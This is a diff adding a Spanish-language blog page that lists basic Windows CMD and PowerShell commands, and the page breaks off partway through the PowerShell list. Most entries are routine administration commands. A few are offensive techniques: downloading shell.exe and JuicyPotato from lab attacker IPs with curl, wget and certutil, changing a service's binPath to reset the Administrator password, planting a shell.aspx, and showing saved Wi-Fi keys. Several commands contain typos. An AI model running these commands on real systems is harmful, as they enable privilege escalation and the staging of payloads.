@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blog de Tecnología</title>
+    <script src="https://kit.fontawesome.com/9474e300a6.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="../css/estilos-articulo.css">
+</head>
+<body>
+
+    <header>
+        <div class="container__header">
+            <div class="logo">
+                <img src="../media/logo-1.png" alt="">
+            </div>
+
+            <div class="menu">
+                <nav>
+                    <ul>
+                        <li><a href="../index.html">Inicio</a></li>
+                        <li><a href="../electronica.html">Electrónica</a></li>
+                        <li><a href="../network.html">Networking</a></li>
+                        <li><a href="../ia.html">Inteligencia Artificial</a></li>
+                        <li><a href="../hacking.html">Ciberseguridad</a></li>
+                    </ul>
+                </nav>
+            </div>
+            <i class="fa-solid fa-bars" style="color: #ffffff;" id="icon_menu"></i>
+            <div class="header__botonMenu">
+                <input type="button" class="btn__header-botonMenu" value="Bonus">
+            </div>
+        </div>
+    </header>
+    <main>
+        <div class="cover">
+            <div class="text__articulo-cover">
+                <h1>Comandos Básicos de Windows</h1>
+                <p>En el mundo de los sistemas Windows, existen dos interfaces de línea de comandos fundamentales: la Command Prompt (CMD) y PowerShell. Ambas ofrecen una serie de comandos que pueden ayudarte a administrar y controlar tu sistema operativo de manera efectiva.</p>
+                <p>La Command Prompt, o simplemente CMD, es una interfaz de línea de comandos que ha estado presente en Windows durante décadas. Aunque ha sido superada por PowerShell en términos de funcionalidad y versatilidad, aún es ampliamente utilizada y es útil para realizar tareas básicas en Windows.</p>
+                <h2>Diferencias Clave</h2>
+                <ul>
+                    <li><marcador class="resaltado8">Sintaxis:</marcador> PowerShell utiliza un enfoque de "verbo-sustantivo" para sus comandos, lo que hace que la sintaxis sea más coherente y legible en comparación con CMD.</li>
+                    <li><marcador class="resaltado8">Capacidad de scripting:</marcador> PowerShell es más adecuado para la creación de scripts avanzados y la automatización de tareas.</li>
+                    <li><marcador class="resaltado8">Soporte para .NET:</marcador> PowerShell ofrece acceso completo al marco de trabajo .NET, lo que permite una mayor funcionalidad y flexibilidad.</li>
+                </ul>
+                <h2>Command Prompt (CMD)</h2>
+                <p>La Command Prompt, o simplemente CMD, es una interfaz de línea de comandos que ha estado presente en Windows durante décadas. Aunque ha sido superada por PowerShell en términos de funcionalidad y versatilidad, aún es ampliamente utilizada y es útil para realizar tareas básicas en Windows.</p>
+                
+                <div class="blog-image-grande">
+                    <img src="media/windows1.jpg" alt="">
+                </div>
+
+                <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando se utiliza para cambiar el directorio actual en la línea de comandos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="cd C:\Users\TuUsuario" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra una lista de archivos y carpetas en el directorio actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="dir" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra el contenido del archivo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="type archivo" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea un nuevo directorio en la ubicación especificada.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="mkdir NuevaCarpeta" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Copia archivos de una ubicación a otra.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="copy archivo_origen.txt destino" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Copia un archivo desde una ubicación a otra.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="copy c:\users\usuario\desktop\shell.aspx c:\inetpub\development\" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Copia archivos y directorios de manera avanzada y eficiente.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="robocopy origen destino /mir" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea un archivo comprimido con apariencia de imagen al combinar dos archivos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="copy /b kitten.jpg+secrets.zip secretphoto.jpg" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Elimina archivos o carpetas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="del archivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Borra un archivo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="erase archivo" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Borra todos los archivos temporales en la carpeta %temp%.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="del /q /f /s %temp%\*" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando abre una página web desde la terminal.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="start https://website" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Borra el contenido de la consola, lo que la hace más legible.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="cls" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Puedes ver una lista de comandos disponibles en la CMD.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="help" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra directorios ocultos en la ruta actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="dir -force" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Lista directorios de manera recursiva en la ruta actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="dir -reurse" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Combina opciones para mostrar directorios ocultos y otros atributos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="dir /adh" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Busca información oculta de forma recursiva en la ruta actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="dir /r /s" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra historial de comandos previamente ejecutados.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="F7" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando muestra una lista de comandos ejecutables en algunas consolas restringidas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Command" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando muestra el nombre de usuario actual del sistema.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="whoami" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, puedes ver la configuración de privilegios del usuario actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="whoami /priv" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando muestra información detallada sobre el usuario actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="whoami /all" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, puedes ver los grupos a los que pertenece el usuario.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="whoami /groups" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, se muestran los grupos en los que se encuentra el usuario actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="net group" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, se muestra información detallada sobre un usuario en particular, incluyendo los grupos a los que pertenece.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="net user usuario" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, puedes ver la configuración de los usuarios del sistema.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="net users" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando muestra información detallada sobre el sistema operativo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="systeminfo" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, puedes ver la configuración de las interfaces de red.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="ipconfig" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Usando este comando, puedes listar las direcciones IP de la red local.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="arp -a" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando muestra los puertos abiertos en el sistema.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="netstat -ano | findstr LISTEN" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando lista las redes disponibles a las que puedes conectarte.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="wlan show profile" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Usando este comando, puedes mostrar la contraseña guardada de una red Wi-Fi específica.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="wlan show profile "RedWifiCasa" key=clear" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Encripta archivos en la ruta actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="cipher /E" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Cambia atributos de un directorio para ocultarlo y protegerlo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="attrib +h +s +r folder" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Cambia atributos de un directorio para hacerlo visible.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="attrib -h -s -r folder" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Accede a la información del sistema y realiza tareas de administración.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="wmic qfe list" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra lista de procesos en ejecución en Windows.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="tasklist" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra un servicio en específico identificado por su PID (ID de proceso).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="tasklist /fi 'pid eq 4'" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Busca si existe algún servicio.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Service -Name Servicio" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Una herramienta de línea de comandos para gestionar discos y particiones.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="diskpart" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Escanea y repara archivos de sistema corruptos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="sfc /scannow" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Verifica y repara problemas en el disco duro.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="chkdsk /f" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Cambia de ruta al registro del sistema donde se almacenan los servicios de Windows.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="CD HKLM:SYSTEM\CurrentControlSet\Services" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Detiene proceso o servicio por su nombre.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Stop-Process - Name proceso" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Detiene proceso o servicio por su nombre.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="cmd /c sc stop proceso" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Inicia proceso o servicio por su nombre.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="sc start servicio" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Inicia proceso o servicio por su nombre, y puede crear archivo de registro con extensión.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="sc start servicio C:\test.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Altera path de un servicio para cambiar contraseña del administrador.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="sc.exe config browser binPath=&quot;C:\Windows\System32\cmd.exe /c net user Administrator pass123$!&quot;" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra privilegios de un archivo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="icacls archivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra reglas de firewall implementadas en perfil de red actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="netsh advfirewall show currentprofile" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Codifica archivo binario en base64 para cargarlo en la máquina.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="certutil.exe -encode binario.exe binario.exe.b64" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, puedes cambiar el prompt de la CMD, lo que facilita la identificación de tu sesión.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="prompt Hola$G" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        El comando title te permite cambiar el título de la ventana de la CMD para una mejor organización.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="title homesweethome" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando muestra información sobre una página web, incluyendo su cabecera.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl -Is http://testphp.vulnweb.com/" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Descarga un archivo llamado "shell.exe" desde la URL "10.13.14.10/shell.exe" y lo guarda en el directorio actual. Esto podría utilizarse para obtener un payload malicioso.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl 10.13.14.10/shell.exe -o shell.exe" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Descarga un archivo llamado "hbd.exe" desde la URL "http://10.10.16.11/hbd.exe" y lo guarda en la ruta especificada "C:\windows\debug\wia".
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="wget http://10.10.16.11/hbd.exe -O C:\windows\debug\wia" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Utiliza la herramienta "certutil" para descargar un archivo llamado "juicyPotato.exe" desde la URL "http://10.10.14.10/juicyPotato.exe". El archivo descargado se guarda como "JP.exe". La opción "-split" indica que se debe dividir el archivo si es necesario.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="certutil -f -urlcache -split http://10.10.14.10/juicyPotato.exe JP.exe" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando te muestra información actualizada sobre el clima en la ubicación especificada (Dallas, en este caso).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl wttr.in/Dallas" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Usando este comando, puedes ver la dirección real detrás de un enlace acortado.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl --head --location "https://ntck.co/itprotv" | findstr Location" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Con este comando, puedes obtener tu dirección IP pública actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl checkip.amazonaws.com" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        El comando curl se utiliza aquí para generar un código QR a partir de una URL.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl qrenco.de/https://facebook.com" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Usando este comando, puedes obtener el video más reciente de un canal de YouTube.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl -s https://decapi.me/youtube/latest_video?user=youtuber" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Este comando te muestra el último tweet de un usuario de Twitter específico.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl -s https://decapi.me/twitter/latest?name=usuario" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Usando este comando, puedes buscar el significado de una palabra dentro de un diccionario en línea.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="curl dict.org/d:palabra" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                <h2>PowerShell</h2>
+                <p>PowerShell es una interfaz de línea de comandos más avanzada que CMD y proporciona una amplia gama de capacidades de administración y automatización en Windows. Combina la facilidad de uso de los comandos tradicionales con la capacidad de escribir scripts más complejos.</p>
+                <p>n su mayoría, los comandos de Command Prompt (Cmd) se pueden ejecutar en PowerShell, ya que PowerShell está diseñado para ser compatible con los comandos de Cmd para facilitar la transición y la interoperabilidad. Sin embargo, en PowerShell, también se pueden utilizar cmdlets específicos de PowerShell para realizar muchas de las mismas tareas de manera más eficiente y con mayor flexibilidad.</p>
+                
+                <div class="blog-image-grande">
+                    <img src="media/windows2.jpg" alt="">
+                </div>
+
+                <div class="contenedor">
+                    <div class="etiqueta">
+                        Ejecuta la consola de PowerShell.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="powershell" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra ayuda para cmdlets y funciones de PowerShell.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Help Get-Process" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Lee el contenido de un archivo.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Content archivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                <div class="contenedor">
+                    <div class="etiqueta">
+                        Similar al comando dir en CMD, muestra una lista de archivos y carpetas en el directorio actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-ChildItem" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra el contenido del directorio (dir) en PowerShell.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-ChildItem -Force" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra los directorios y archivos ocultos en la ruta actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="gci -force" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Lista archivos que coinciden con patrón de nombre específico en la ruta actual.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="gci -force palabra*" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Muestra directorios y archivos de la ruta actual, incluyendo los ocultos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="ls -force" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Lista archivos dentro de un directorio y sus subdirectorios de manera recursiva.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="ls -force directorio -recurse" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Ver el contenido de un binario.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Select-String CONTEXT WindowsService.exe" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Equivalente al comando cd en CMD, cambia el directorio actual en PowerShell.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Set-Location C:\Users\TuUsuario" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea nuevos archivos.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="New-Item -ItemType File -Path C:\ruta\nuevoarchivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Crea un nuevo directorio en la ubicación especificada.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="New-Item -ItemType Directory -Path C:\NuevaCarpeta" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Copia archivos o carpetas de una ubicación a otra.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Copy-Item -Path archivo_origen.txt -Destination destino" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Elimina archivos o carpetas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Remove-Item archivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
